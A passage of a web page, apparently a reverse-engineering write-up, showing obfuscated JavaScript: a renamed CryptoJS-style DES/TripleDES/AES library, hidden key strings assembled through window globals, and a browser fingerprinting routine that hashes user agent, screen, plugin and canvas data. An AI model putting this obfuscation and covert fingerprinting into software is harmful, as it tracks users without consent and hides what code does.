class="number">131072</span>,</span><br><span class="line">        <span class="number">24</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">25</span>: <span class="number">131104</span>,</span><br><span class="line">        <span class="number">26</span>: <span class="number">134348800</span>,</span><br><span class="line">        <span class="number">27</span>: <span class="number">134219808</span>,</span><br><span class="line">        <span class="number">28</span>: <span class="number">134350880</span>,</span><br><span class="line">        <span class="number">29</span>: <span class="number">133120</span>,</span><br><span class="line">        <span class="number">30</span>: <span class="number">2080</span>,</span><br><span class="line">        <span class="number">31</span>: <span class="number">134217728</span>,</span><br><span class="line">        <span class="number">2147483664</span>: <span class="number">131072</span>,</span><br><span class="line">        <span class="number">2147483665</span>: <span class="number">2048</span>,</span><br><span class="line">        <span class="number">2147483666</span>: <span class="number">134348832</span>,</span><br><span class="line">        <span class="number">2147483667</span>: <span class="number">133152</span>,</span><br><span class="line">        <span class="number">2147483668</span>: <span class="number">32</span>,</span><br><span class="line">        <span class="number">2147483669</span>: <span class="number">134348800</span>,</span><br><span class="line">        <span class="number">2147483670</span>: <span class="number">134217728</span>,</span><br><span class="line">        <span class="number">2147483671</span>: <span class="number">134219808</span>,</span><br><span class="line">        <span class="number">2147483672</span>: <span class="number">134350880</span>,</span><br><span class="line">        <span class="number">2147483673</span>: <span class="number">134217760</span>,</span><br><span class="line">        <span class="number">2147483674</span>: <span class="number">134219776</span>,</span><br><span class="line">        <span class="number">2147483675</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">2147483676</span>: <span class="number">133120</span>,</span><br><span class="line">        <span class="number">2147483677</span>: <span class="number">2080</span>,</span><br><span class="line">        <span class="number">2147483678</span>: <span class="number">131104</span>,</span><br><span class="line">        <span class="number">2147483679</span>: <span class="number">134350848</span></span><br><span class="line">    &#125;]</span><br><span class="line">      , h = [<span class="number">483991120</span>, <span class="number">1058535</span>, <span class="number">512567407</span>, <span class="number">10651221</span>, <span class="number">217723</span>]</span><br><span class="line">      , u = [<span class="number">4160749569</span>, <span class="number">528482304</span>, <span class="number">33030144</span>, <span class="number">2064384</span>, <span class="number">129024</span>, <span class="number">8064</span>, <span class="number">504</span>, <span class="number">2147483679</span>]</span><br><span class="line">      , p = o.<span class="property">DES</span> = n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">_doReset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">_key</span>.<span class="property">words</span>, t = [], r = <span class="number">0</span>; <span class="number">56</span> &gt; r; r++) &#123;</span><br><span class="line">                <span class="keyword">var</span> n = a[r] - <span class="number">1</span>;</span><br><span class="line">                t[r] = e[n &gt;&gt;&gt; <span class="number">5</span>] &gt;&gt;&gt; <span class="number">31</span> - n % <span class="number">32</span> &amp; <span class="number">1</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (e = <span class="variable language_">this</span>.<span class="property">_subKeys</span> = [],</span><br><span class="line">            n = <span class="number">0</span>; <span class="number">16</span> &gt; n; n++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = e[n] = [], o = c[n], r = <span class="number">0</span>; <span class="number">24</span> &gt; r; r++)</span><br><span class="line">                    i[r / <span class="number">6</span> | <span class="number">0</span>] |= t[(s[r] - <span class="number">1</span> + o) % <span class="number">28</span>] &lt;&lt; <span class="number">31</span> - r % <span class="number">6</span>,</span><br><span class="line">                    i[<span class="number">4</span> + (r / <span class="number">6</span> | <span class="number">0</span>)] |= t[<span class="number">28</span> + (s[r + <span class="number">24</span>] - <span class="number">1</span> + o) % <span class="number">28</span>] &lt;&lt; <span class="number">31</span> - r % <span class="number">6</span>;</span><br><span class="line">                <span class="keyword">for</span> (i[<span class="number">0</span>] = i[<span class="number">0</span>] &lt;&lt; <span class="number">1</span> | i[<span class="number">0</span>] &gt;&gt;&gt; <span class="number">31</span>,</span><br><span class="line">                r = <span class="number">1</span>; <span class="number">7</span> &gt; r; r++)</span><br><span class="line">                    i[r] &gt;&gt;&gt;= <span class="number">4</span> * (r - <span class="number">1</span>) + <span class="number">3</span>;</span><br><span class="line">                i[<span class="number">7</span>] = i[<span class="number">7</span>] &lt;&lt; <span class="number">5</span> | i[<span class="number">7</span>] &gt;&gt;&gt; <span class="number">27</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (t = <span class="variable language_">this</span>.<span class="property">_invSubKeys</span> = [],</span><br><span class="line">            r = <span class="number">0</span>; <span class="number">16</span> &gt; r; r++)</span><br><span class="line">                t[r] = e[<span class="number">15</span> - r]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">encryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doCryptBlock</span>(e, t, <span class="variable language_">this</span>.<span class="property">_subKeys</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">decryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doCryptBlock</span>(e, t, <span class="variable language_">this</span>.<span class="property">_invSubKeys</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doCryptBlock</span>: <span class="keyword">function</span>(<span class="params">r, n, i</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_lBlock</span> = r[n],</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_rBlock</span> = r[n + <span class="number">1</span>],</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">4</span>, <span class="number">252645135</span>),</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">16</span>, <span class="number">65535</span>),</span><br><span class="line">            t.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">2</span>, <span class="number">858993459</span>),</span><br><span class="line">            t.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">8</span>, <span class="number">16711935</span>),</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">1</span>, <span class="number">1431655765</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>; <span class="number">16</span> &gt; o; o++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> a = i[o], s = <span class="variable language_">this</span>.<span class="property">_lBlock</span>, c = <span class="variable language_">this</span>.<span class="property">_rBlock</span>, h = <span class="number">0</span>, p = <span class="number">0</span>; <span class="number">8</span> &gt; p; p++)</span><br><span class="line">                    h |= l[p][((c ^ a[p]) &amp; u[p]) &gt;&gt;&gt; <span class="number">0</span>];</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_lBlock</span> = c,</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_rBlock</span> = s ^ h</span><br><span class="line">            &#125;</span><br><span class="line">            i = <span class="variable language_">this</span>.<span class="property">_lBlock</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_lBlock</span> = <span class="variable language_">this</span>.<span class="property">_rBlock</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_rBlock</span> = i,</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">1</span>, <span class="number">1431655765</span>),</span><br><span class="line">            t.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">8</span>, <span class="number">16711935</span>),</span><br><span class="line">            t.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">2</span>, <span class="number">858993459</span>),</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">16</span>, <span class="number">65535</span>),</span><br><span class="line">            e.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">4</span>, <span class="number">252645135</span>),</span><br><span class="line">            r[n] = <span class="variable language_">this</span>.<span class="property">_lBlock</span>,</span><br><span class="line">            r[n + <span class="number">1</span>] = <span class="variable language_">this</span>.<span class="property">_rBlock</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">keySize</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">ivSize</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">blockSize</span>: <span class="number">2</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="variable language_">window</span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;rzKrleD&quot;</span>, <span class="number">2</span>, <span class="number">2</span>)] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; h.<span class="property">length</span>; c++)</span><br><span class="line">        <span class="variable language_">window</span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;rzKrleD&quot;</span>, <span class="number">2</span>, <span class="number">2</span>)] += h[c];</span><br><span class="line">    r.<span class="property">DES</span> = n.<span class="title function_">_createHelper</span>(p),</span><br><span class="line">    o = o.<span class="property">TripleDES</span> = n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">_doReset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">_key</span>.<span class="property">words</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des1</span> = p.<span class="title function_">createEncryptor</span>(i.<span class="title function_">create</span>(e.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">2</span>))),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des2</span> = p.<span class="title function_">createEncryptor</span>(i.<span class="title function_">create</span>(e.<span class="title function_">slice</span>(<span class="number">2</span>, <span class="number">4</span>))),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des3</span> = p.<span class="title function_">createEncryptor</span>(i.<span class="title function_">create</span>(e.<span class="title function_">slice</span>(<span class="number">4</span>, <span class="number">6</span>)))</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">encryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des1</span>.<span class="title function_">encryptBlock</span>(e, t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des2</span>.<span class="title function_">decryptBlock</span>(e, t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des3</span>.<span class="title function_">encryptBlock</span>(e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">decryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des3</span>.<span class="title function_">decryptBlock</span>(e, t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des2</span>.<span class="title function_">encryptBlock</span>(e, t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_des1</span>.<span class="title function_">decryptBlock</span>(e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">keySize</span>: <span class="number">6</span>,</span><br><span class="line">        <span class="attr">ivSize</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">blockSize</span>: <span class="number">2</span></span><br><span class="line">    &#125;),</span><br><span class="line">    r.<span class="property">TripleDES</span> = n.<span class="title function_">_createHelper</span>(o)</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = coypJsDk, t = e.<span class="property">lib</span>.<span class="property">BlockCipher</span>, r = e.<span class="property">algo</span>, n = [], i = [], o = [], a = [], s = [], c = [], l = [], h = [], u = [], p = [], f = [], d = <span class="number">0</span>; <span class="number">256</span> &gt; d; d++)</span><br><span class="line">        f[d] = <span class="number">128</span> &gt; d ? d &lt;&lt; <span class="number">1</span> : d &lt;&lt; <span class="number">1</span> ^ <span class="number">283</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> _ = <span class="number">0</span>, y = <span class="number">0</span>, d = <span class="number">0</span>; <span class="number">256</span> &gt; d; d++) &#123;</span><br><span class="line">        <span class="keyword">var</span> g = y ^ y &lt;&lt; <span class="number">1</span> ^ y &lt;&lt; <span class="number">2</span> ^ y &lt;&lt; <span class="number">3</span> ^ y &lt;&lt; <span class="number">4</span></span><br><span class="line">          , g = g &gt;&gt;&gt; <span class="number">8</span> ^ <span class="number">255</span> &amp; g ^ <span class="number">99</span>;</span><br><span class="line">        n[_] = g,</span><br><span class="line">        i[g] = _;</span><br><span class="line">        <span class="keyword">var</span> v = f[_]</span><br><span class="line">          , m = f[v]</span><br><span class="line">          , k = f[m]</span><br><span class="line">          , w = <span class="number">257</span> * f[g] ^ <span class="number">16843008</span> * g;</span><br><span class="line">        o[_] = w &lt;&lt; <span class="number">24</span> | w &gt;&gt;&gt; <span class="number">8</span>,</span><br><span class="line">        a[_] = w &lt;&lt; <span class="number">16</span> | w &gt;&gt;&gt; <span class="number">16</span>,</span><br><span class="line">        s[_] = w &lt;&lt; <span class="number">8</span> | w &gt;&gt;&gt; <span class="number">24</span>,</span><br><span class="line">        c[_] = w,</span><br><span class="line">        w = <span class="number">16843009</span> * k ^ <span class="number">65537</span> * m ^ <span class="number">257</span> * v ^ <span class="number">16843008</span> * _,</span><br><span class="line">        l[g] = w &lt;&lt; <span class="number">24</span> | w &gt;&gt;&gt; <span class="number">8</span>,</span><br><span class="line">        h[g] = w &lt;&lt; <span class="number">16</span> | w &gt;&gt;&gt; <span class="number">16</span>,</span><br><span class="line">        u[g] = w &lt;&lt; <span class="number">8</span> | w &gt;&gt;&gt; <span class="number">24</span>,</span><br><span class="line">        p[g] = w,</span><br><span class="line">        _ ? (_ = v ^ f[f[f[k ^ v]]],</span><br><span class="line">        y ^= f[f[y]]) : _ = y = <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> b = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">128</span>, <span class="number">27</span>, <span class="number">54</span>]</span><br><span class="line">      , r = r.<span class="property">DES</span> = t.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">_doReset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">_key</span>, t = e.<span class="property">words</span>, r = e.<span class="property">sigBytes</span> / <span class="number">4</span>, e = <span class="number">4</span> * ((<span class="variable language_">this</span>.<span class="property">_nRounds</span> = r + <span class="number">6</span>) + <span class="number">1</span>), i = <span class="variable language_">this</span>.<span class="property">_keySchedule</span> = [], o = <span class="number">0</span>; e &gt; o; o++)</span><br><span class="line">                <span class="keyword">if</span> (r &gt; o)</span><br><span class="line">                    i[o] = t[o];</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">var</span> a = i[o - <span class="number">1</span>];</span><br><span class="line">                    o % r ? r &gt; <span class="number">6</span> &amp;&amp; <span class="number">4</span> == o % r &amp;&amp; (a = n[a &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | n[a &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | n[a &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | n[<span class="number">255</span> &amp; a]) : (a = a &lt;&lt; <span class="number">8</span> | a &gt;&gt;&gt; <span class="number">24</span>,</span><br><span class="line">                    a = n[a &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | n[a &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | n[a &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | n[<span class="number">255</span> &amp; a],</span><br><span class="line">                    a ^= b[o / r | <span class="number">0</span>] &lt;&lt; <span class="number">24</span>),</span><br><span class="line">                    i[o] = i[o - r] ^ a</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">for</span> (t = <span class="variable language_">this</span>.<span class="property">_invKeySchedule</span> = [],</span><br><span class="line">            r = <span class="number">0</span>; e &gt; r; r++)</span><br><span class="line">                o = e - r,</span><br><span class="line">                a = r % <span class="number">4</span> ? i[o] : i[o - <span class="number">4</span>],</span><br><span class="line">                t[r] = <span class="number">4</span> &gt; r || <span class="number">4</span> &gt;= o ? a : l[n[a &gt;&gt;&gt; <span class="number">24</span>]] ^ h[n[a &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>]] ^ u[n[a &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>]] ^ p[n[<span class="number">255</span> &amp; a]]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">encryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doCryptBlock</span>(e, t, <span class="variable language_">this</span>.<span class="property">_keySchedule</span>, o, a, s, c, n)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">decryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = e[t + <span class="number">1</span>];</span><br><span class="line">            e[t + <span class="number">1</span>] = e[t + <span class="number">3</span>],</span><br><span class="line">            e[t + <span class="number">3</span>] = r,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doCryptBlock</span>(e, t, <span class="variable language_">this</span>.<span class="property">_invKeySchedule</span>, l, h, u, p, i),</span><br><span class="line">            r = e[t + <span class="number">1</span>],</span><br><span class="line">            e[t + <span class="number">1</span>] = e[t + <span class="number">3</span>],</span><br><span class="line">            e[t + <span class="number">3</span>] = r</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doCryptBlock</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n, i, o, a, s</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="variable language_">this</span>.<span class="property">_nRounds</span>, l = e[t] ^ r[<span class="number">0</span>], h = e[t + <span class="number">1</span>] ^ r[<span class="number">1</span>], u = e[t + <span class="number">2</span>] ^ r[<span class="number">2</span>], p = e[t + <span class="number">3</span>] ^ r[<span class="number">3</span>], f = <span class="number">4</span>, d = <span class="number">1</span>; c &gt; d; d++)</span><br><span class="line">                <span class="keyword">var</span> _ = n[l &gt;&gt;&gt; <span class="number">24</span>] ^ i[h &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] ^ o[u &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] ^ a[<span class="number">255</span> &amp; p] ^ r[f++]</span><br><span class="line">                  , y = n[h &gt;&gt;&gt; <span class="number">24</span>] ^ i[u &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] ^ o[p &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] ^ a[<span class="number">255</span> &amp; l] ^ r[f++]</span><br><span class="line">                  , g = n[u &gt;&gt;&gt; <span class="number">24</span>] ^ i[p &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] ^ o[l &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] ^ a[<span class="number">255</span> &amp; h] ^ r[f++]</span><br><span class="line">                  , p = n[p &gt;&gt;&gt; <span class="number">24</span>] ^ i[l &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] ^ o[h &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] ^ a[<span class="number">255</span> &amp; u] ^ r[f++]</span><br><span class="line">                  , l = _</span><br><span class="line">                  , h = y</span><br><span class="line">                  , u = g;</span><br><span class="line">            _ = (s[l &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | s[h &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | s[u &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | s[<span class="number">255</span> &amp; p]) ^ r[f++],</span><br><span class="line">            y = (s[h &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | s[u &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | s[p &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | s[<span class="number">255</span> &amp; l]) ^ r[f++],</span><br><span class="line">            g = (s[u &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | s[p &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | s[l &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | s[<span class="number">255</span> &amp; h]) ^ r[f++],</span><br><span class="line">            p = (s[p &gt;&gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span> | s[l &gt;&gt;&gt; <span class="number">16</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">16</span> | s[h &gt;&gt;&gt; <span class="number">8</span> &amp; <span class="number">255</span>] &lt;&lt; <span class="number">8</span> | s[<span class="number">255</span> &amp; u]) ^ r[f++],</span><br><span class="line">            e[t] = _,</span><br><span class="line">            e[t + <span class="number">1</span>] = y,</span><br><span class="line">            e[t + <span class="number">2</span>] = g,</span><br><span class="line">            e[t + <span class="number">3</span>] = p</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">keySize</span>: <span class="number">8</span></span><br><span class="line">    &#125;);</span><br><span class="line">    e.<span class="property">DES</span> = t.<span class="title function_">_createHelper</span>(r)</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">ea_</span> = <span class="string">&quot;e&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> coyp = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> ea_ + av_ + nvl_</span><br><span class="line">&#125;();</span><br><span class="line">coypJsDk.<span class="property">mode</span>.<span class="property">CBC</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = coypJsDk.<span class="property">lib</span>.<span class="property">BlockCipherMode</span>.<span class="title function_">extend</span>();</span><br><span class="line">    <span class="keyword">return</span> e.<span class="property">Encryptor</span> = e.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">processBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_cipher</span>.<span class="title function_">encryptBlock</span>(e, t)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    e.<span class="property">Decryptor</span> = e.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">processBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_cipher</span>.<span class="title function_">decryptBlock</span>(e, t)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    e</span><br><span class="line">&#125;();</span><br><span class="line"><span class="keyword">var</span> referFingerprint = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t, r;</span><br><span class="line">    t = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">forEach</span>,</span><br><span class="line">    r = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">map</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">each</span> = <span class="keyword">function</span>(<span class="params">e, r, n</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> !== e)</span><br><span class="line">            <span class="keyword">if</span> (t &amp;&amp; e.<span class="property">forEach</span> === t)</span><br><span class="line">                e.<span class="title function_">forEach</span>(r, n);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">length</span> === +e.<span class="property">length</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, o = e.<span class="property">length</span>; o &gt; i; i++)</span><br><span class="line">                    <span class="keyword">if</span> (r.<span class="title function_">call</span>(n, e[i], i, e) === &#123;&#125;)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> a <span class="keyword">in</span> e)</span><br><span class="line">                    <span class="keyword">if</span> (e.<span class="title function_">hasOwnProperty</span>(a) &amp;&amp; r.<span class="title function_">call</span>(n, e[a], a, e) === &#123;&#125;)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    ,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">map</span> = <span class="keyword">function</span>(<span class="params">e, t, n</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> i = [];</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span> == e ? i : r &amp;&amp; e.<span class="property">map</span> === r ? e.<span class="title function_">map</span>(t, n) : (<span class="variable language_">this</span>.<span class="title function_">each</span>(e, <span class="keyword">function</span>(<span class="params">e, r, o</span>) &#123;</span><br><span class="line">            i[i.<span class="property">length</span>] = t.<span class="title function_">call</span>(n, e, r, o)</span><br><span class="line">        &#125;),</span><br><span class="line">        i)</span><br><span class="line">    &#125;</span><br><span class="line">    ,</span><br><span class="line">    <span class="string">&quot;object&quot;</span> == <span class="keyword">typeof</span> e ? (<span class="variable language_">this</span>.<span class="property">hasher</span> = e.<span class="property">hasher</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">screen_resolution</span> = e.<span class="property">screen_resolution</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">canvas</span> = e.<span class="property">canvas</span>,</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">ie_activex</span> = e.<span class="property">ie_activex</span>) : <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> e &amp;&amp; (<span class="variable language_">this</span>.<span class="property">hasher</span> = e)</span><br><span class="line">&#125;;</span><br><span class="line">referFingerprint.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = [];</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="title function_">push</span>(navigator.<span class="property">userAgent</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(navigator.<span class="property">language</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(screen.<span class="property">colorDepth</span>),</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">screen_resolution</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="title function_">getScreenResolution</span>();</span><br><span class="line">            <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> t &amp;&amp; e.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">getScreenResolution</span>().<span class="title function_">join</span>(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_">push</span>((<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTimezoneOffset</span>()),</span><br><span class="line">        e.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">hasSessionStorage</span>()),</span><br><span class="line">        e.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">hasLocalStorage</span>()),</span><br><span class="line">        e.<span class="title function_">push</span>(!!<span class="variable language_">window</span>.<span class="property">indexedDB</span>),</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span> ? e.<span class="title function_">push</span>(<span class="keyword">typeof</span> <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">addBehavior</span>) : e.<span class="title function_">push</span>(<span class="string">&quot;undefined&quot;</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(<span class="keyword">typeof</span> <span class="variable language_">window</span>.<span class="property">openDatabase</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(navigator.<span class="property">cpuClass</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(navigator.<span class="property">platform</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(navigator.<span class="property">doNotTrack</span>),</span><br><span class="line">        e.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">getPluginsString</span>()),</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">canvas</span> &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">isCanvasSupported</span>() &amp;&amp; e.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">getCanvasFingerprint</span>()),</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">hasher</span> ? <span class="variable language_">this</span>.<span class="title function_">hasher</span>(e.<span class="title function_">join</span>(<span class="string">&quot;###&quot;</span>), <span class="number">31</span>) : <span class="variable language_">this</span>.<span class="title function_">murmurhash3_32_gc</span>(e.<span class="title function_">join</span>(<span class="string">&quot;###&quot;</span>), <span class="number">31</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    